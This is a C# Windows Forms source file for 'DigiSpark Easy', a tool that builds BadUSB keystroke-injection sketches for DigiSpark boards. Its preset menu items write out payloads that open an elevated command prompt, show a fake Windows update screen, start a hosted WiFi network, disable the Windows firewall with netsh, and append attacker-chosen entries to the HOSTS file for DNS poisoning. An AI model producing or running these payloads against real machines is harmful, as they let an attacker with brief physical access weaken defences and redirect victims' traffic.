using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DigiSpark_Easy
{
    public partial class FrmMain : Form
    {
        String script = "";
        ListViewItem item = new ListViewItem("Item1", 0);
        public FrmMain()
        {
            InitializeComponent();
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            txtDefiniciones.AppendText("#include \"DigiKeyboard.h\"" + "\r\n");
        }

        private void btnDelay_Click(object sender, EventArgs e)
        {
            txtScript.AppendText("DigiKeyboard.delay("+txtDelay.Text+");" + "\r\n");         
        }

        private void btnString_Click(object sender, EventArgs e)
        {
            txtScript.AppendText("DigiKeyboard.println(\"" + txtString.Text + "\");" + "\r\n");
            txtScript.AppendText("DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n");
        }

        private void btnGUIx_Click_1(object sender, EventArgs e)
        {
            txtScript.AppendText("DigiKeyboard.sendKeyStroke("+ ((Button)sender).Tag + ",MOD_GUI_LEFT);" + "\r\n");
            txtScript.AppendText("DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n");
        }

        private void btnTab_Click(object sender, EventArgs e)
        {
            
        }

        private void btnIzq_Click(object sender, EventArgs e)
        {
            txtScript.AppendText("DigiKeyboard.sendKeyStroke("+ ((Button)sender).Tag + ");" + "\r\n");
            txtScript.AppendText("DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n");
            switch (((Button)sender).Tag)
            {
                case "KEY_UP":
                    if (!txtDefiniciones.Text.Contains(((Button)sender).Tag.ToString()))
                    {
                        txtDefiniciones.AppendText("#define " + ((Button)sender).Tag + " 82" + "\r\n");
                    }
                    break;
                case "KEY_RIGHTARROW":
                    if (!txtDefiniciones.Text.Contains(((Button)sender).Tag.ToString()))
                    {
                        txtDefiniciones.AppendText("#define " + ((Button)sender).Tag + " 79" + "\r\n");
                    }
                    break;
                case "KEY_LEFTARROW":
                    if (!txtDefiniciones.Text.Contains(((Button)sender).Tag.ToString()))
                    {
                        txtDefiniciones.AppendText("#define " + ((Button)sender).Tag + " 80" + "\r\n");
                    }
                    break;
                case "KEY_DOWNARROW":
                    if (!txtDefiniciones.Text.Contains(((Button)sender).Tag.ToString()))
                    {
                        txtDefiniciones.AppendText("#define " + ((Button)sender).Tag + " 81" + "\r\n");
                    }
                    break;
            }
        }

        private void btnEnter_Click_1(object sender, EventArgs e)
        {
            txtScript.AppendText("DigiKeyboard.sendKeyStroke(" + ((Button)sender).Tag + ");" + "\r\n");
            txtScript.AppendText("DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n");
            switch (((Button)sender).Tag)
            {
                case "KEY_TAB":
                    if (!txtDefiniciones.Text.Contains(((Button)sender).Tag.ToString()))
                    {
                        txtDefiniciones.AppendText("#define " + ((Button)sender).Tag + " 43" + "\r\n");
                    }
                    break;
                case "KEY_DELETE":
                    if (!txtDefiniciones.Text.Contains(((Button)sender).Tag.ToString()))
                    {
                        txtDefiniciones.AppendText("#define " + ((Button)sender).Tag + " 42" + "\r\n");
                    }
                    break;
                case "KEY_ENTER":
                    if (!txtDefiniciones.Text.Contains(((Button)sender).Tag.ToString()))
                    {
                        txtDefiniciones.AppendText("#define " + ((Button)sender).Tag + " 40" + "\r\n");
                    }
                    break;
                case "KEY_SPACE":
                    if (!txtDefiniciones.Text.Contains(((Button)sender).Tag.ToString()))
                    {
                        txtDefiniciones.AppendText("#define " + ((Button)sender).Tag + " 44" + "\r\n");
                    }
                    break;
            }
        }

        private void btnAltF4_Click(object sender, EventArgs e)
        {
            txtScript.AppendText("DigiKeyboard.sendKeyStroke(" + ((Button)sender).Tag + ",MOD_ALT_LEFT);" + "\r\n");
            txtScript.AppendText("DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n");
            if (!txtDefiniciones.Text.Contains(((Button)sender).Tag.ToString()))
            {
                txtDefiniciones.AppendText("#define " + ((Button)sender).Tag + " 61" + "\r\n");
            }
        }

        private void guardarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            String str = "";
            StreamWriter sW;
            if (guardarFD.ShowDialog() == DialogResult.OK)
            {
                sW = new StreamWriter(guardarFD.FileName, true);
                str += txtDefiniciones.Text+"\n";
                str += "void setup() {" + "\n" + "DigiKeyboard.sendKeyStroke(0);" + "\n";
                str += txtScript.Text + "}" + "\n";
                str += "void loop() {"+"\n"+"}";
                sW.WriteLine(str);
                sW.Close();
                sW.Dispose();
                MessageBox.Show("Fichero guardado con exito!","DigiSpark Easy",MessageBoxButtons.OK,MessageBoxIcon.Information);
            }
        }

        private void archivoToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void opción1ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            txtScript.Text += "DigiKeyboard.delay("+txtDelayDefault.Text+");" + "\r\n" +
                "DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);" + "\r\n" +
                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
                "DigiKeyboard.println(\"a\");" + "\r\n" +
                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
                "DigiKeyboard.sendKeyStroke(KEY_TAB);" + "\r\n" +
                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
                "DigiKeyboard.sendKeyStroke(KEY_TAB);" + "\r\n" +
                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
                "DigiKeyboard.sendKeyStroke(KEY_ENTER);" + "\r\n" +
                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n";
            if (!txtDefiniciones.Text.Contains(btnTab.Tag.ToString()))
            {
                txtDefiniciones.AppendText("#define " + btnTab.Tag + " 43" + "\r\n");
            }
            if (!txtDefiniciones.Text.Contains(btnEnter.Tag.ToString()))
            {
                txtDefiniciones.AppendText("#define " + btnEnter.Tag + " 40" + "\r\n");
            }
        }

        private void opción2ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            txtScript.Text += "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
                "DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);" + "\r\n" +
                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
                "DigiKeyboard.println(\"C>&Windows&System32\");" + "\r\n" +
                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
                "DigiKeyboard.sendKeyStroke(KEY_C);" + "\r\n" +
                "DigiKeyboard.sendKeyStroke(KEY_M);" + "\r\n" +
                "DigiKeyboard.sendKeyStroke(KEY_D);" + "\r\n" +
                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
                "DigiKeyboard.sendKeyStroke(KEY_F10, MOD_SHIFT_LEFT);" + "\r\n" +
                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
                "DigiKeyboard.sendKeyStroke(KEY_A);" + "\r\n" +
                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
                "DigiKeyboard.sendKeyStroke(KEY_A);" + "\r\n" +
                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
                "DigiKeyboard.sendKeyStroke(KEY_ENTER);" + "\r\n" +
                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
                "DigiKeyboard.sendKeyStroke(KEY_LEFTARROW);" + "\r\n" +
                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
                "DigiKeyboard.sendKeyStroke(KEY_ENTER);" + "\r\n" +
                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n";
            if (!txtDefiniciones.Text.Contains("#define MOD_SHIFT_LEFT (1<<1)"))
            {
                txtDefiniciones.AppendText("#define MOD_SHIFT_LEFT (1<<1)" + "\r\n");
            }
            if (!txtDefiniciones.Text.Contains("#define KEY_F10 0x43"))
            {
                txtDefiniciones.AppendText("#define KEY_F10 0x43" + "\r\n");
            }
            if (!txtDefiniciones.Text.Contains("#define KEY_LEFTARROW 80"))
            {
                txtDefiniciones.AppendText("#define KEY_LEFTARROW 80" + "\r\n");
            }
        }

        private void windows10ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            txtScript.Text += "DigiKeyboard.delay("+txtDelayDefault.Text+");" + "\r\n" +
                "DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);" + "\r\n" +
                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
                "DigiKeyboard.println(\"iexplore http>&&fakeupdate.net&win10u&index.html\");" + "\r\n" +
                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
                "DigiKeyboard.sendKeyStroke(KEY_F11);" + "\r\n" +
                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n";
            if (!txtDefiniciones.Text.Contains("#define KEY_F11 0x44"))
            {
                txtDefiniciones.AppendText("#define KEY_F11 0x44" + "\r\n");
            }
        }

        private void wiFiAccessPointToolStripMenuItem_Click(object sender, EventArgs e)
        {
            txtScript.Text += "DigiKeyboard.println(\"netsh wlan set hostednetwork mode)allow ssid)digispark key)123456789\");" + "\r\n" +
                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
                "DigiKeyboard.println(\"netsh wlan start hostednetwork\");" + "\r\n" +
                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n" +
                "DigiKeyboard.println(\"netsh firewall set opmode disable\");" + "\r\n" +
                "DigiKeyboard.delay(" + txtDelayDefault.Text + ");" + "\r\n";
        }

        private void btnAdd_Click(object sender, EventArgs e)
        {
            if (txtIP.Text!="" && txtDNS.Text!="")
            {
                ListViewItem item = new ListViewItem(txtIP.Text);
                item.SubItems.Add(txtDNS.Text);
                listaDNS.Items.Add(item);
            }
        }

        private void dnsPoisoningToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listaDNS.Items.Count==0)
            {
                MessageBox.Show("La lista no puede estar vacia");
            }
            else
            {
                txtScript.Text += "DigiKeyboard.println(\"echo. || C>&WINDOWS&SYSTEM32&DRIVERS&ETC&HOSTS\");" + "\r\n" +
                    "DigiKeyboard.delay(100);" + "\r\n";
                for (int i = 0; i < listaDNS.Items.Count; i++)
                {
                    txtScript.Text += "DigiKeyboard.println(\"echo " + listaDNS.Items[i].SubItems[0].Text + " " + listaDNS.Items[i].SubItems[1].Text + " || C>&WINDOWS&SYSTEM32&DRIVERS&ETC&HOSTS\");" + "\r\n" +
                        "DigiKeyboard.delay(100);" + "\r\n";
                }
                
            }
        }

        private void btnLimpiar_Click(object sender, EventArgs e)
        {
            listaDNS.Items.Clear();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            listaDNS.SelectedItems[0].Remove();
        }

        private void btnModificar_Click(object sender, EventArgs e)
        {
            listaDNS.SelectedItems[0].SubItems[0].Text = txtIP.Text;
            listaDNS.SelectedItems[0].SubItems[1].Text = txtDNS.Text;
            /*foreach (ListViewItem item in listaDNS.SelectedItems)
            {
                item.SubItems[0].Text = txtIP.Text;
                item.SubItems[1].Text = txtDNS.Text;
            }*/
        }
    }
}
